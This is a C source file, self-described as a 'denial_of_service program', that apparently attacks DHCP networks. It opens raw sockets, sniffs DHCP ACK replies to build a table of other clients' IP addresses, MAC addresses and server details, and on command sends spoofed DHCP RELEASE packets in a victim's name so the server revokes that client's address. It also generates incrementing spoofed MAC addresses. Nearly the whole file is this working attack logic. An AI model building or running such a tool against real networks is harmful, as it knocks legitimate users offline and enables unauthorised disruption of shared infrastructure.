/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include "construct_dhcp_packet.h"
#include "dhcp_protocol.h"
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>
#include <time.h>

char interface[IFNAMSIZ]={0};
#define ARPHRD_ETHER 1
#define USERMAX 1000
struct netlink_msg{
	struct nlmsghdr  nh;
	struct ifinfomsg itf;
	char attrbuf[512];
};

typedef struct user{
	unsigned int ip;
	unsigned int server_ip;
	unsigned char hwmac[6];
	unsigned char server_mac[6];
}User;

void send_fd(char *s){
	write(STDOUT_FILENO, s, strlen(s));
}
int record_user(unsigned int ip, unsigned int server_ip, unsigned char *hw_addr, unsigned char *server_mac);

User users[USERMAX];
int user_num = 0;
void convertip(unsigned int ip, char *s){
	sprintf(s, "%s", inet_ntoa(*(struct in_addr *)&ip));
}
void release_ip(char *s, unsigned xid){
	int ip_int[4];
	sscanf(s, "%d.%d.%d.%d", &ip_int[0], &ip_int[1], &ip_int[2], &ip_int[3]);
	// printf("%d %d %d %d\n", ip_int[0], ip_int[1], ip_int[2], ip_int[3]);
	unsigned int total = (ip_int[0]) + (ip_int[1] << 8) + (ip_int[2] << 16) + (ip_int[3] << 24);
	// printf("%s -> %u\n", s, total);

	for(int i = 0; i < user_num; i++){
		if(users[i].ip == total){
			send_dhcp_packet(xid, users[i].hwmac, users[i].server_mac, &users[i].ip, &users[i].server_ip, &users[i].server_ip, &users[i].ip, DHCP_RELEASE);
		return;
		}
	}
	printf("find no user\n");
	return ;
}
void print_table(){
	for(int i = 0; i < user_num; i++){
		char buf[1000] = {};
		char ip[32] = {};
		convertip(users[i].ip, ip);
		char server_ip[32] = {};
		convertip(users[i].server_ip, server_ip);
		sprintf(buf, "user[%d]:\tip:%s\tserver ip:%s\n", i, ip, server_ip);
		send_fd(buf);
	}
}
int main(int argc,char **argv){

	if(argc!=4){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface> <i (hwmac + i)> <xid>\n");
		exit(-1);
	}

	if(strlen(argv[1])>=IFNAMSIZ){
		fprintf(stderr,"interface name too long\n");
		exit(-1);
	}

	//Copy interface name to a global variable.
	memcpy(interface,argv[1],IFNAMSIZ);


	// set mac and xid
	// unsigned char *hwmac = argv[2];
	unsigned int xid = atoi(argv[3]);

	unsigned char hwmac[6]={0x80,0xa5,0x89,0xa2,0xc5,0xff};
	//unsigned int xid = 12346;
	
	int last = 5;
	for(int i = 0; i < atoi(argv[2]) ; i++)
	{
		while(hwmac[last] == 0xff)
		{
			last -=1 ;
		}
		xid++;
		hwmac[last] += 0x01;
	}
	

	int sd;
	// fprintf(stdout,"htons(ETH_P_IP) = %d\n", htons(ETH_P_IP));
	// fprintf(stdout,"%d\n", IPPROTO_RAW);
	if((sd=socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW))<0){
		perror("socket()");
		exit(-1);
	}

	// fprintf(stdout,"sd %d\n",sd);

	// get mac address
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,interface,strlen(interface));

	// strncpy(itface.ifr_name,"ens38",IFNAMSIZ);
	if(ioctl(sd,SIOCGIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr, "interface: %s\n", argv[1]);
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}

	unsigned char fixed_mac[6];
	memcpy(fixed_mac, itface.ifr_hwaddr.sa_data, 6);
	
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	//Bind our file descriptor to this interface.
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);

	int recv_sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if(recv_sd < 0){
		perror("recv socket()");
		exit(0);
	}

	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 0;
	fd_set readfds;

	unsigned int server_ip;
	while(1){
		FD_ZERO(&readfds);
		// should need to add STDIN to get parent input
		FD_SET(recv_sd, &readfds);
		FD_SET(STDIN_FILENO, &readfds);

		// printf("select\n");
		if(select(recv_sd+1, &readfds, NULL, NULL, &tv)<0){
			perror("select()");
			exit(-1);
		};

		if(FD_ISSET(recv_sd, &readfds)){

			unsigned char packet_in[PACKETMAXSIZE] = {};
			Packet *p = (Packet *)packet_in;
			int recv_msg_len=recvfrom(recv_sd,packet_in,PACKETMAXSIZE,0,NULL,NULL);

			if(memcmp(p -> udp.srcPort, "\x00\x43", 2) != 0) continue;

			struct dhcp_header *dhcp;
			dhcp = (struct dhcp_header*)&(p -> data);

			if(dhcp -> op != 2) continue;
			int isACK = 1;
			for(int offset = 4/* skip magic cookie*/;isACK;){
				unsigned char option = dhcp -> exten[offset];
				if(option == 0xff) break;
				offset ++;
				int len = dhcp -> exten[offset];
				offset ++;
				switch(option){
					case 53: //message type
						if(dhcp -> exten[offset] != DHCP_ACK){
							// send_fd(inet_ntoa(*(struct in_addr *)&(dhcp -> your_ip)));
							// fprintf(stdout,"get ip: %s\n", inet_ntoa(*(struct in_addr *)&(dhcp -> your_ip)));
							isACK = 0;
						}else{
							printf("[INFO] get ACK\n");
						}
						break;
					case 54:
						memcpy(&server_ip, &(dhcp -> exten[offset]), sizeof(unsigned int));
						if(record_user(dhcp -> your_ip, server_ip, dhcp -> hw_addr, p -> l2.srcMAC) < 0){
							perror("record_user");
							exit(0);
						}
						//struct in_addr *dhcp_server_ip = (struct in_addr *)&(dhcp -> exten[offset]);
						//fprintf(stdout,"server ip : %s\n", inet_ntoa(*dhcp_server_ip));
						break;
					default:
						break;
				}
				offset += len;
			}
		}
		if(FD_ISSET(STDIN_FILENO, &readfds)){
			// write(STDERR_FILENO, "[QUERY]\n", strlen("[QUERY]\n"));
			char cmd[1024] = {};
			int nbytes = read(STDIN_FILENO, cmd, sizeof(cmd));
			char *pch = strtok(cmd, " ");
			int count = 0;
			char opt[64] = {};
			char value[64] = {};
			while(pch != NULL){
				if(count == 0){
					sscanf(pch, "%s", opt);
				}else if(count == 1){
					sscanf(pch, "%s", value);
				}else if(count == 2){
					write(STDERR_FILENO, "[ERROR] out of range\n", strlen("out of range\n"));
				}
				count ++;
				pch = strtok(NULL, " ");
			}
			printf("[QUERY] opt: %s, value: %s\n", opt, value);
			if(strcmp(opt, "status") == 0){
				print_table();
			}else if(strcmp(opt, "release") == 0){
				release_ip(value, xid);
			}else{
				write(STDERR_FILENO, "[ERROR] unknown option\n", strlen("unknown option\n"));
			}
			// write(STDOUT_FILENO, buf, nbytes);
			// dhcp_protocol(sd,xid,hwmac, "\x9c\x5c\xf9\x2a\x9f\x00",&aquired_ipaddress, (unsigned int *)"\x08\x08\x08\x08",itface ,fixed_mac, DHCP_DISCOVER);
		}
	}
	return 0;
}

int record_user(unsigned int ip, unsigned int server_ip, unsigned char *hw_addr, unsigned char *server_mac){
	for(int i = 0; i < user_num; i++){
		if(users[i].ip == ip){
			users[i].server_ip = server_ip;
			memcpy(users[i].hwmac, hw_addr, 6);
			memcpy(users[i].server_mac, server_mac, 6);
			return 1;
		}
	}
	if(user_num < USERMAX){
		printf("[INFO] Create new user\n");
		users[user_num].ip = ip;
		users[user_num].server_ip = server_ip;
		memcpy(users[user_num].hwmac, hw_addr, 6);
		user_num += 1;
	}else{
		printf("User is full!");
	}
	return 1;
}
